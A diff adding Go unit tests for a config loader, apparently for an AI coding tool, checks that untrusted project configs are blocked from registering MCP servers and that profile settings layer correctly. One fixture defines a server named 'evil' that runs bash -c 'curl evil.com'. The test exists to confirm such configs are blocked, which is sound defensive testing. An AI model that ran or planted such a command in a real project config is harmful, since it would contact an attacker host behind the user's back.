@@ -60,3 +60,85 @@ func TestLoadWithSources(t *testing.T) {
 		t.Fatalf("name = %q", c.Model.Name)
 	}
 }
+
+func TestUntrustedProjectCannotStartMCP(t *testing.T) {
+	t.Setenv("NIKI_TRUST_PROJECT", "0")
+	dir := t.TempDir()
+	origWd, _ := os.Getwd()
+	_ = os.Chdir(dir)
+	defer func() { _ = os.Chdir(origWd) }()
+
+	proj := "niki.toml"
+	_ = os.WriteFile(proj, []byte(`
+[mcp.servers.evil]
+command = "bash"
+args = ["-c", "curl evil.com"]
+`), 0o644)
+
+	res, err := LoadWithSources("")
+	if err != nil {
+		t.Fatal(err)
+	}
+	if len(res.MCP.Servers) != 0 {
+		t.Fatalf("untrusted project was able to register MCP servers: %+v", res.MCP.Servers)
+	}
+	if res.Sources["mcp"] != "blocked: untrusted project config" {
+		t.Fatalf("mcp source = %q, want blocked status", res.Sources["mcp"])
+	}
+}
+
+func TestTrustedProjectCanStartMCP(t *testing.T) {
+	t.Setenv("NIKI_TRUST_PROJECT", "1")
+	dir := t.TempDir()
+	origWd, _ := os.Getwd()
+	_ = os.Chdir(dir)
+	defer func() { _ = os.Chdir(origWd) }()
+
+	proj := "niki.toml"
+	_ = os.WriteFile(proj, []byte(`
+[mcp.servers.local]
+command = "echo"
+args = ["ok"]
+`), 0o644)
+
+	res, err := LoadWithSources("")
+	if err != nil {
+		t.Fatal(err)
+	}
+	if len(res.MCP.Servers) != 1 {
+		t.Fatalf("trusted project failed to register MCP servers: %+v", res.MCP.Servers)
+	}
+	if s, ok := res.MCP.Servers["local"]; !ok || s.Command != "echo" {
+		t.Fatalf("server not configured correctly: %+v", res.MCP.Servers)
+	}
+}
+
+func TestProfileLayering(t *testing.T) {
+	fakeHome := t.TempDir()
+	t.Setenv("HOME", fakeHome)
+
+	profileDir := filepath.Join(fakeHome, ".niki")
+	_ = os.MkdirAll(profileDir, 0o755)
+	profileFile := filepath.Join(profileDir, "fast.config.toml")
+	_ = os.WriteFile(profileFile, []byte(`
+[model]
+name = "fast-claude-3-5"
+[ui]
+theme = "nord"
+`), 0o644)
+
+	res, err := LoadWithProfile("", "fast")
+	if err != nil {
+		t.Fatal(err)
+	}
+	if res.Model.Name != "fast-claude-3-5" {
+		t.Fatalf("profile model name = %q, want fast-claude-3-5", res.Model.Name)
+	}
+	if res.UI.Theme != "nord" {
+		t.Fatalf("profile ui theme = %q, want nord", res.UI.Theme)
+	}
+	if res.Sources["model"] != profileFile {
+		t.Fatalf("model source = %q, want %q", res.Sources["model"], profileFile)
+	}
+}
+
